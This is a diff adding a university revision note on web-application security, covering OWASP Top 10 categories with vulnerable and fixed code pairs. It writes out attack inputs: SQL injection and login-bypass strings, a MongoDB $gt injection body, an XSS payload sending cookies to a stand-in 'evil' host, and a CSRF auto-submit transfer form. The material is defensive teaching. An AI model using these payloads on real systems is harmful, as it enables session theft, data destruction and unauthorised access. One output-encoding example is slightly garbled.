@@ -1,0 +1,462 @@
+---
+title: "Week 11 — Web application security"
+unit: COMP4347
+week: 11
+type: overview
+status: done
+---
+
+## Why this week matters more than any other
+
+**Web application security is the highest-yield topic on the COMP4347 exam.** Past papers consistently feature an XSS or SQLi snippet to diagnose, a CSRF defence question, an OWASP mitigation match-up, and at least one short answer on authentication versus authorisation. If you only have a weekend to revise, spend it here.
+
+The unit's framing follows Martin Fowler's *Basics of Web Application Security* and the OWASP Top 10 (2021). The exam expects you to:
+
+1. **Name the vulnerability** when shown a vulnerable code snippet (Express handler, Mongoose query, HTML template).
+2. **Name the canonical mitigation** — parameterised queries, output encoding, CSRF tokens, CSP, RBAC, HTTPS+HSTS, etc.
+3. **Rewrite the snippet safely** in a few lines of JavaScript or pseudocode.
+4. **Distinguish overlapping concepts** — authentication vs authorisation, reflected vs stored vs DOM XSS, SameSite=Lax vs Strict, hashing vs encryption.
+
+The lecturer's emphasis (from the W11 slides and tutorial) is heavy on **injection** (SQL and NoSQL), **XSS**, **CSRF**, and **HTTPS/TLS**. The OWASP Top 10 is enumerated in slide 42 but the deeper treatment lives in the Fowler reading and the tutorial. Expect questions like *"the following Node.js route is vulnerable to which OWASP Top 10 category?"* — so learn to map symptoms to categories.
+
+This note is structured around three pillars: **server-side threats** (injection, broken access, SSRF), **client-side threats** (XSS, CSRF, clickjacking), and **transport/configuration** (TLS, HSTS, CSP, misconfig). Each ends with a vulnerable-versus-safe code pair.
+
+## The core security vocabulary
+
+Before any specific attack, lock down the four foundational concepts. Slide 5 of the W11 lecture lists these and exam questions routinely test you can separate them.
+
+**Authentication (AuthN) — "who are you?"** The process of verifying an identity claim. Single-factor (password), multi-factor (password + OTP), or delegated (sign-in with Google, OpenID Connect). It happens once per session and produces a credential the server can verify on every subsequent request — typically a session cookie or a signed JWT.
+
+**Authorisation (AuthZ) — "what may you do?"** The process of checking whether an already-authenticated principal has permission to perform a specific action on a specific resource. Almost always implemented as **role-based access control (RBAC)**: users map to roles, roles map to permissions on resources. The lecture's example mapping is:
+
+```js
+const policy = {
+  roles: ['guest', 'member', 'admin'],
+  allows: [
+    { role: 'guest',  resources: 'blogs',          permissions: ['get'] },
+    { role: 'member', resources: ['blogs','forums'], permissions: ['get','post'] },
+    { role: 'admin',  resources: '*',              permissions: ['*'] },
+  ],
+};
+```
+
+**Confidentiality.** Only authorised parties can read the data. Achieved in transit by HTTPS/TLS; at rest by encryption (AES) or hashing (bcrypt for passwords).
+
+**Integrity.** Data cannot be tampered with undetected. Achieved by MACs, digital signatures, and TLS's record layer. Hashing alone is not integrity if the attacker can replace both data and hash — you need a *keyed* MAC or a signature.
+
+A frequent exam trap: **hashing is not encryption**. Encryption is reversible with a key; hashing is one-way. You hash passwords (so even a DB dump doesn't reveal them); you encrypt payment details (because you need to decrypt them later).
+
+## The OWASP Top 10 (2021), with one mitigation each
+
+The OWASP Top 10 is the canonical taxonomy of web vulnerabilities, updated every three or four years. Learn the categories cold — the exam will give you a scenario and ask which category it belongs to.
+
+**A01 — Broken Access Control.** Server fails to enforce who may do what. Includes IDOR (changing `?userId=42` to `?userId=43`), missing role checks on admin endpoints, and forced browsing to hidden URLs. **Mitigation:** authorise *every* request server-side, against the *current* user, by re-reading the resource and checking ownership.
+
+**A02 — Cryptographic Failures.** Sensitive data exposed or stored badly. Plaintext passwords, MD5 in 2026, TLS 1.0 still enabled, JWTs accepting `alg: none`. **Mitigation:** TLS 1.2+ only, bcrypt/argon2 for passwords, AES-GCM for data at rest, secrets in a vault, not in source.
+
+**A03 — Injection.** Untrusted input interpreted as code by a downstream parser — SQL, NoSQL, OS shell, LDAP, XPath. **Mitigation:** parameterised queries / prepared statements; never concatenate user input into a query string.
+
+**A04 — Insecure Design.** A flaw in the architecture, not the implementation. Example: a "forgot password" flow that emails the password back. **Mitigation:** threat-model early; choose secure design patterns (e.g., password reset via single-use signed token).
+
+**A05 — Security Misconfiguration.** Default admin/admin still works, S3 bucket public, stack-trace error pages in production, CORS set to `*`. **Mitigation:** harden defaults; automate config audits; never ship with debug enabled.
+
+**A06 — Vulnerable & Outdated Components.** Using a library with a known CVE. **Mitigation:** `npm audit`, Dependabot, lock files, remove unused deps.
+
+**A07 — Identification & Authentication Failures.** Weak password rules, no rate limiting on login, session IDs predictable, password reset tokens not single-use. **Mitigation:** strong password policy + MFA + lockout + secure session management.
+
+**A08 — Software & Data Integrity Failures.** Unsigned updates, insecure deserialisation, CI/CD pipeline trusted blindly. **Mitigation:** signed packages (SRI for CDN scripts), avoid deserialising untrusted data with `eval`/`pickle`/native serialisers.
+
+**A09 — Security Logging & Monitoring Failures.** Breaches go undetected because no one is logging or alerting. **Mitigation:** structured logs of auth events, centralised collection, alerting on anomalies.
+
+**A10 — Server-Side Request Forgery (SSRF).** The server fetches a URL the user supplied, allowing the attacker to reach internal services (`http://169.254.169.254/` on AWS to steal IAM credentials). **Mitigation:** allow-list outbound destinations, block private/link-local IP ranges, drop redirects.
+
+The lecturer's slide 42 uses slightly different wording ("Mishandling of Exceptional Conditions") for some categories but the substance matches. If the exam asks the lecture's list, give the lecture's wording.
+
+## SQL injection: the canonical injection attack
+
+**SQL injection happens when user input is concatenated into a SQL string and the database parses it as code.** This is the classic from slide 34, and yes, the xkcd "Little Bobby Tables" reference is in the slides.
+
+The vulnerable pattern:
+
+```js
+function addStudent(lastName, firstName) {
+  const query = "INSERT INTO students (last_name, first_name) VALUES ('"
+              + lastName + "', '" + firstName + "')";
+  db.execute(query);
+}
+```
+
+With innocuous input `firstName = "Martin"`, `lastName = "Fowler"`, the query is fine. But with `lastName = "Robert'); DROP TABLE Students; --"`, concatenation produces:
+
+```sql
+INSERT INTO students (last_name, first_name)
+VALUES ('Robert'); DROP TABLE Students; --', 'XKCD')
+```
+
+The `'` closes the string, `);` ends the INSERT, `DROP TABLE` runs, `--` comments out the trailing junk. The database happily executes both statements.
+
+The **login bypass** variant from slide 35 is the one most likely to appear on the exam:
+
+```sql
+SELECT * FROM users WHERE username = '$username' AND password = '$password'
+```
+
+Submit `username = "' or 1=1--"` and any password. The query becomes:
+
+```sql
+SELECT * FROM users WHERE username = '' or 1=1--' AND password = ''
+```
+
+`1=1` is always true, `--` comments out the password check, you log in as the first user in the table (often the admin).
+
+**The fix is parameterised queries.** Never build SQL by concatenation:
+
+```js
+// safe — driver handles escaping
+db.execute(
+  "INSERT INTO students (last_name, first_name) VALUES (?, ?)",
+  [lastName, firstName]
+);
+```
+
+Or use an ORM that does it for you: `User.findOne({ username, password })` with proper schema-typed fields. Input validation (allow-list characters, cast to string) is a useful second layer but **not** a substitute for parameterisation.
+
+## NoSQL injection: the tutorial's set-piece attack
+
+The W11 tutorial spends most of its time on **NoSQL injection in MongoDB**, so this is almost guaranteed to appear in some form. The attack is subtler than SQL injection because the input isn't concatenated into a string — it's smuggled in as a JSON *object* that Mongoose interprets as a query operator.
+
+The vulnerable route looks like a textbook login:
+
+```js
+app.post('/', (req, res) => {
+  const { username, password } = req.body;
+  User.findOne({ username, password }, (err, user) => {
+    if (user) res.send(`<p>Welcome back ${user.username}!!!</p>`);
+    else res.send('Login failed');
+  });
+});
+```
+
+If `req.body` is parsed as JSON, an attacker sends:
+
+```http
+POST / HTTP/1.1
+Content-Type: application/json
+
+{ "username": {"$gt": ""}, "password": {"$gt": ""} }
+```
+
+Mongoose now runs `find({ username: {$gt: ""}, password: {$gt: ""} })` — "any user whose username is greater than empty string and whose password is greater than empty string" — which matches **every user**. `findOne` returns the first, attacker is logged in.
+
+The `urlencoded` body parser admits the same attack via bracket syntax: `username[$gt]=&password[$gt]=`. The browser may reject `Content-Type: application/json` from a form, but Postman or VS Code's REST Client will happily send it.
+
+**Mitigations, in order of robustness:**
+
+1. **Cast inputs to strings** before they touch the query: `User.findOne({ username: String(username), password: String(password) })`. This collapses `{$gt: ""}` to the string `"[object Object]"`, which matches nothing.
+2. **Schema validation** with Mongoose or Zod — declare username/password as strings and reject anything else at the boundary.
+3. **Strip `$`-prefixed keys** with middleware like `express-mongo-sanitize`.
+4. **Never hash-compare in the query**; fetch by username, then `bcrypt.compare` the password in code.
+
+The tutorial explicitly calls out option 1 and option 2 ("validate user input, or escape/filter white space or special characters"). Know both.
+
+## Cross-Site Scripting (XSS) in depth
+
+**XSS is when an attacker's JavaScript ends up running in a victim's browser, inside your origin's security context.** Because the script runs as your origin, it can read cookies (unless `HttpOnly`), make authenticated requests on the user's behalf, and rewrite the page. There are three flavours.
+
+**Reflected XSS.** The attacker crafts a URL containing a payload; the server reflects that payload back into the response without escaping. Victim clicks the link, payload executes. The lecture's example (slide 37):
+
+```js
+const communicationType = req.body.communicationType;
+if (communicationType !== 'email' && communicationType !== 'text') {
+  res.send("Can't send by type " + communicationType);  // VULNERABLE
+}
+```
+
+If `communicationType` is `<script>fetch('http://evil/?c='+document.cookie)</script>`, the script runs in the victim's page.
+
+**Stored XSS.** The payload is saved on the server (in a comment, profile bio, forum post) and served back to every viewer. Worse than reflected because no social engineering is needed — anyone visiting the page is hit. The tutorial's chat-app scenario is stored XSS.
+
+**DOM-based XSS.** The vulnerability is entirely client-side: JS reads from `location.hash`, `document.referrer`, or a query parameter and writes it into the DOM via `innerHTML`, `document.write`, or `eval`. The server never sees the payload. The tutorial reproduces this with:
+
+```
+http://localhost:3000/?q=<img src="x" onerror="alert(document.cookie)">
+```
+
+`<script>` tags injected via `innerHTML` don't fire, but `onerror` on a broken `<img>` does — a useful exam trap.
+
+**The two canonical mitigations:**
+
+1. **Contextual output encoding.** Escape `<`, `>`, `&`, `"`, `'` when interpolating into HTML; use `\xHH` escaping inside JS string literals; use `encodeURIComponent` inside URL contexts. The right escape depends on the *context*, hence "contextual". Templating engines (EJS `<%= %>`, React JSX) do this by default; raw string concatenation does not. The slide's example: `<script>` becomes `<script>`, which renders as text instead of executing.
+2. **Prefer safe DOM APIs.** Use `element.textContent = userInput` instead of `element.innerHTML = userInput`. `textContent` always treats input as text; `innerHTML` parses HTML.
+
+A third, defence-in-depth layer is **Content Security Policy** — covered in its own section below.
+
+## Content Security Policy (CSP) directives
+
+**CSP is a browser-enforced allow-list for where scripts, styles, images, and other resources may load from.** It is delivered as an HTTP response header (or a `<meta>` tag, but the header form is preferred). A well-configured CSP turns most XSS into a footgun: even if the attacker injects a `<script>`, the browser refuses to run it.
+
+A minimal, useful policy for an app that hosts everything itself:
+
+```http
+Content-Security-Policy: default-src 'self';
+  script-src 'self';
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: https:;
+  connect-src 'self';
+  frame-ancestors 'none';
+  base-uri 'self';
+  form-action 'self';
+  upgrade-insecure-requests
+```
+
+**Key directives to recognise:**
+
+- `default-src` — fallback for any unspecified directive.
+- `script-src` — controls JS sources. `'self'` allows same-origin; `'unsafe-inline'` allows `<script>...</script>` and `onerror=` (almost always a bug); `'unsafe-eval'` allows `eval`; `'nonce-XYZ'` and `'sha256-...'` allow specific scripts.
+- `style-src` — controls CSS sources.
+- `img-src`, `connect-src`, `font-src`, `media-src` — controls images, fetch/XHR/WebSocket destinations, fonts, audio/video.
+- `frame-ancestors 'none'` — modern replacement for `X-Frame-Options: DENY` (clickjacking defence).
+- `base-uri` — restricts `<base href>` injection.
+- `form-action` — restricts where forms may POST.
+- `upgrade-insecure-requests` — auto-rewrites `http://` to `https://`.
+
+The tutorial's example is `Content-Security-Policy: script-src 'self' https://apis.google.com` — same-origin scripts plus a Google CDN. Anything else is blocked and logged in the console. Use `Content-Security-Policy-Report-Only` to monitor without enforcing while you tune the policy.
+
+## Cross-Site Request Forgery (CSRF)
+
+**CSRF tricks a victim's browser into making an authenticated request to your site that the victim did not intend.** It exploits the fact that browsers automatically attach cookies to requests, regardless of which origin initiated them.
+
+The attack: the user is logged into `bank.com`. They visit `evil.com`, which contains:
+
+```html
+<img src="https://bank.com/transfer?to=attacker&amount=10000">
+<!-- or, for POST endpoints: -->
+<form action="https://bank.com/transfer" method="POST">
+  <input name="to" value="attacker">
+  <input name="amount" value="10000">
+</form>
+<script>document.forms[0].submit()</script>
+```
+
+The browser fetches the image, attaches the `bank.com` session cookie, the bank's server sees an authenticated request, the transfer goes through. The victim's browser never even shows them the response — but the side-effect (the money moving) has happened.
+
+**Three layered defences:**
+
+1. **Synchroniser token pattern.** Server embeds a random, unguessable token in every form and stores its hash in the session. Every state-changing request must include that token; the server rejects requests where the token is missing or wrong. The attacker can't read it (same-origin policy stops cross-origin reads) so can't forge it.
+
+   ```html
+   <form method="POST" action="/transfer">
+     <input type="hidden" name="_csrf" value="a8f9c3...">
+     <input name="amount">
+   </form>
+   ```
+
+2. **Double-submit cookie.** Server sets a random cookie *and* requires the same value as a header or form field on state-changing requests. Same-origin policy prevents `evil.com` from reading or setting cookies for `bank.com`, so it can't satisfy the match.
+
+3. **`SameSite` cookies.** Set the session cookie with `SameSite=Lax` (the modern default) or `SameSite=Strict`. The browser then refuses to send the cookie on cross-site POSTs (Lax) or any cross-site request at all (Strict). This single attribute neutralises most CSRF.
+
+   ```http
+   Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax; Path=/
+   ```
+
+`SameSite=Lax` still sends cookies on top-level GET navigations, so GETs must remain side-effect-free (which RFC 7231 requires anyway). Origin/Referer header validation is a useful belt-and-braces check but cannot stand alone.
+
+## Broken Access Control and IDOR
+
+**Insecure Direct Object Reference (IDOR) is broken access control's most common form: the server checks who you are but not whether you may access the specific record.** Change `?orderId=42` to `?orderId=43` in the URL, see someone else's order.
+
+Vulnerable:
+
+```js
+app.get('/orders/:id', requireAuth, async (req, res) => {
+  const order = await db.order.findUnique({ where: { id: req.params.id } });
+  res.json(order);  // missing ownership check
+});
+```
+
+Safe:
+
+```js
+app.get('/orders/:id', requireAuth, async (req, res) => {
+  const order = await db.order.findUnique({ where: { id: req.params.id } });
+  if (!order) return res.status(404).end();
+  if (order.userId !== req.user.id && req.user.role !== 'admin') {
+    return res.status(403).end();
+  }
+  res.json(order);
+});
+```
+
+The pattern that scales: do authorisation as **middleware that knows the resource type**, e.g. `requireOwnership('order')`, so individual handlers can't forget. Better still, use a query that *includes the owner predicate*: `db.order.findFirst({ where: { id, userId: req.user.id } })` — if the user doesn't own the row, the query returns nothing and the 404 falls out for free.
+
+**Other broken-access-control patterns to recognise:**
+
+- **Forced browsing** — `/admin/users` is unlinked from the UI but unprotected on the server. Security through obscurity is not security.
+- **Method tampering** — `GET /transfer` is protected but `POST /transfer` isn't, or vice versa.
+- **Mass assignment** — `Object.assign(user, req.body)` lets the attacker set `user.role = 'admin'`. Use an explicit allow-list of fields.
+- **JWT trust** — accepting `alg: none`, not verifying the signature, or trusting claims like `role` baked into a JWT the user themselves can issue (overlaps with A02 and A07).
+
+## Clickjacking and frame protection
+
+**Clickjacking lures a victim into clicking something on your site that they didn't realise they were clicking, by overlaying your page in an invisible iframe under attacker-controlled content.** Example: `evil.com` loads `bank.com/transfer` in a transparent iframe positioned exactly under a fake "Claim your prize" button. Victim clicks the button; the click actually lands on the bank's "Confirm transfer" button.
+
+**Two defences, both response headers:**
+
+```http
+X-Frame-Options: DENY
+```
+
+The classic. `DENY` forbids framing entirely. `SAMEORIGIN` allows framing only by pages on the same origin. `ALLOW-FROM` exists but is deprecated and inconsistently supported.
+
+```http
+Content-Security-Policy: frame-ancestors 'none';
+```
+
+The modern replacement, part of CSP Level 2. More expressive — `frame-ancestors 'self' https://trusted.partner.com` is possible — and supersedes `X-Frame-Options` where both are set. New code should use `frame-ancestors`; old code can keep `X-Frame-Options` as a fallback for ancient browsers.
+
+A subtler clickjacking variant is **UI redress with drag-and-drop or copy-paste** to steal CSRF tokens visible in the DOM. The defence is the same: don't allow framing.
+
+## HTTPS, TLS, and HSTS
+
+**HTTPS is HTTP over TLS.** TLS provides three guarantees: confidentiality (encrypted), integrity (tampered packets are detected), and authentication (the server proves it owns the domain via a certificate signed by a trusted CA).
+
+**The TLS handshake, in four moves (lecture slide 30):**
+
+1. **ClientHello** — client says "I support TLS 1.3, these cipher suites, here's a random number."
+2. **ServerHello + Certificate** — server picks a cipher suite, returns its X.509 certificate chain, sends its own random number.
+3. **Key agreement** — both sides derive a symmetric session key (ECDHE in modern TLS) without ever sending it in clear. The certificate is used to authenticate the server (and optionally the client), not to exchange the key directly.
+4. **Finished** — both sides send a MAC over the handshake transcript to prove no one tampered. From here on, all records are encrypted with the symmetric key.
+
+**Certificates and the chain of trust.** A certificate binds a public key to a domain name and is signed by a Certificate Authority (CA). The browser trusts a fixed root-store of CAs; intermediates chain up to those roots. If a chain doesn't validate (expired, wrong domain, untrusted CA, revoked) the browser shows the big red warning page from slide 31.
+
+**HSTS — HTTP Strict Transport Security.** A header that tells the browser "from now on, always use HTTPS for this domain, even if the user types `http://`":
+
+```http
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+```
+
+Without HSTS, the user's first request to `http://bank.com` is sent in clear and is hijackable (SSL-strip attack). With HSTS pinned, the browser upgrades to HTTPS internally and never makes the cleartext request. `preload` opts the domain into a hard-coded list shipped with browsers, eliminating even the first-visit window.
+
+Always set HSTS on HTTPS responses; never on HTTP responses (the spec ignores it). Pair with `upgrade-insecure-requests` in CSP for mixed-content auto-rewriting.
+
+## Authentication failures: passwords, sessions, rate limits
+
+The OWASP A07 category is broad; the exam tends to focus on three concrete subtopics.
+
+**Password storage.** Never store plaintext. Never use MD5, SHA-1, or even raw SHA-256 — they are too fast. Use a memory-hard, salted, slow KDF: **bcrypt**, **scrypt**, or **argon2id**. Each user gets a unique salt (handled automatically by these libraries). Cost factor should be tuned so a single hash takes ~100ms on your server's hardware.
+
+```js
+// safe
+const hash = await bcrypt.hash(password, 12);
+// later
+const ok = await bcrypt.compare(submitted, hash);
+```
+
+**Session management.** Session IDs must be cryptographically random and at least 128 bits. Cookies must be `HttpOnly` (no JS access, defeats most cookie-stealing XSS), `Secure` (HTTPS only), and `SameSite=Lax` or stricter. Rotate the session ID on login (defeats session fixation). Expire idle sessions.
+
+**Brute-force and credential-stuffing defences.** A login endpoint that responds in 50ms and has no rate limit is a free guessing oracle.
+
+- **Rate limit by IP and by username** — e.g. 5 attempts per minute per IP, 10 per hour per username.
+- **Exponential backoff** after repeated failures.
+- **Account lockout** after N consecutive failures (but be careful — attackers can use this as a DoS).
+- **CAPTCHA** after the first failure.
+- **MFA** — neutralises credential stuffing even when the password is correct.
+- **Generic error messages** — "invalid username or password", not "user not found" (prevents enumeration).
+
+A 4xx response with `Retry-After` is the polite way to rate-limit:
+
+```http
+HTTP/1.1 429 Too Many Requests
+Retry-After: 60
+```
+
+## Security misconfiguration and headers
+
+A surprising amount of "hardening" is just sending the right response headers. Memorise this set:
+
+```http
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Content-Security-Policy: default-src 'self'; frame-ancestors 'none'
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: geolocation=(), camera=(), microphone=()
+Cache-Control: no-store    # for sensitive responses
+```
+
+`X-Content-Type-Options: nosniff` stops browsers from guessing MIME types — a JSON endpoint returning attacker data won't be re-interpreted as HTML and executed. `Referrer-Policy` controls how much of the URL leaks to other origins. `Permissions-Policy` (formerly `Feature-Policy`) gates powerful browser APIs.
+
+Other misconfiguration traps:
+
+- **CORS set to `Access-Control-Allow-Origin: *` with `Allow-Credentials: true`** — the browser actually refuses this combination, but devs reflect the request's Origin and allow credentials, which is just as bad.
+- **Debug pages in production** — stack traces, env vars, source maps exposed.
+- **Default admin credentials** still set.
+- **Directory listing** enabled on the web server.
+- **Verbose error messages** leaking SQL or stack traces (helps the attacker tune their injection).
+
+The Express `helmet` middleware sets sensible defaults for most of these headers in one line — know it by name.
+
+## Server-Side Request Forgery (SSRF) and supply-chain risks
+
+**SSRF: your server fetches a URL the user supplied, and the attacker uses that to reach things only your server can see.** The crown jewel on cloud platforms is the **instance metadata endpoint** — `http://169.254.169.254/latest/meta-data/iam/security-credentials/` on AWS — which hands out short-lived IAM credentials to anything that asks from the instance. SSRF turns a "fetch this user-supplied URL" feature into "give me your cloud credentials."
+
+```js
+// VULNERABLE — image proxy
+app.get('/proxy', async (req, res) => {
+  const r = await fetch(req.query.url);
+  r.body.pipe(res);
+});
+```
+
+Mitigations:
+
+- **Allow-list destinations** — only fetch from known external domains.
+- **Block private IP ranges** — `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `::1`, `fc00::/7`. Re-check after DNS resolution and after any redirect.
+- **Disable redirects** or follow them with the same checks.
+- **Drop dangerous schemes** — only allow `http://` and `https://`.
+- **Use IMDSv2 on AWS** — requires a session token, defeats most SSRF.
+
+**A08 — Software and Data Integrity Failures.** Closely related. A CDN-hosted script with no Subresource Integrity check can be swapped by the CDN operator (or an attacker who compromises them). The defence is SRI:
+
+```html
+<script src="https://cdn.example/app.js"
+        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
+        crossorigin="anonymous"></script>
+```
+
+If the script's hash doesn't match, the browser refuses to run it.
+
+## Defence in depth: the layered mindset
+
+**No single control is sufficient.** The exam loves to ask "is X enough?" — and the answer is almost always "no, combine it with Y." Build the habit of stacking defences:
+
+| Threat | Primary defence | Secondary | Tertiary |
+|---|---|---|---|
+| SQL/NoSQL injection | Parameterised queries / ORM | Input validation | Least-privilege DB user |
+| XSS | Contextual output encoding | CSP | `HttpOnly` cookies |
+| CSRF | `SameSite=Lax` cookies | Synchroniser token | Origin/Referer check |
+| Broken access | Server-side check per request | Owner-predicate queries | Audit logging |
+| Brute force | Rate limit + lockout | MFA | Anomaly detection |
+| Session hijacking | HTTPS + `HttpOnly` + `Secure` | Rotate on login | Short idle timeout |
+| MITM | TLS 1.2+ | HSTS preload | Certificate pinning |
+| Clickjacking | `frame-ancestors 'none'` | `X-Frame-Options: DENY` | — |
+| SSRF | Destination allow-list | Block private IPs | IMDSv2 |
+| Supply chain | Lockfiles + audit | SRI on CDN scripts | Signed builds |
+
+Notice how many rows have a **server-side** primary defence and a **header** as defence-in-depth. If a question gives you only a client-side mitigation, that's a hint the answer wants the server-side one as well.
+
+## Common exam patterns
+
+Five archetypes appear on every past paper. Recognise them on sight.
+
+**Pattern 1: "Identify the vulnerability."** You're shown a route handler or a template. The tells: string concatenation into a query (SQLi/NoSQLi), `res.send(req.body.x)` or `innerHTML = userInput` (XSS), `findUnique({ id: req.params.id })` with no ownership check (IDOR), `fetch(req.query.url)` (SSRF), missing CSRF token on a `POST` that has side effects (CSRF). Name the OWASP category *and* the specific attack.
+
+**Pattern 2: "Rewrite this safely."** Don't just say "use parameterised queries" — show the rewrite. For SQLi: `db.execute(sql, params)`. For NoSQLi: `String(username)` cast plus schema. For XSS: `textContent` not `innerHTML`, and/or template auto-escaping. For IDOR: add the `userId` predicate to the query.
+
+**Pattern 3: "Authentication vs authorisation."** A short-answer favourite. AuthN = who you are; AuthZ = what you may do. AuthN happens once per session; AuthZ on every request. Login form = AuthN; RBAC check = AuthZ. Common trick: "is changing role from member to admin in the client-side state an authentication failure or an authorisation failure?" — authorisation, because identity is unchanged.
+
+**Pattern 4: "Which mitigation matches which attack?"** A match-up table. Learn the canonical pairings: parameterised queries → SQLi; output encoding + CSP → XSS; CSRF token + SameSite → CSRF; HSTS → SSL-strip; SRI → supply chain; `frame-ancestors` → clickjacking; bcrypt → password DB leak; rate limiting → brute force.
+
+**Pattern 5: "Explain how HTTPS gives you X."** Three parts: confidentiality from symmetric encryption (AES-GCM) of the record layer; integrity from the MAC built into AEAD; authentication of the server from the X.509 certificate signed by a trusted CA. Bonus marks if you mention the handshake establishes a fresh symmetric key per session via ECDHE so past sessions can't be decrypted even if the server's private key is later compromised (forward secrecy).
+
+If you can do these five patterns cold, you have the security exam locked.
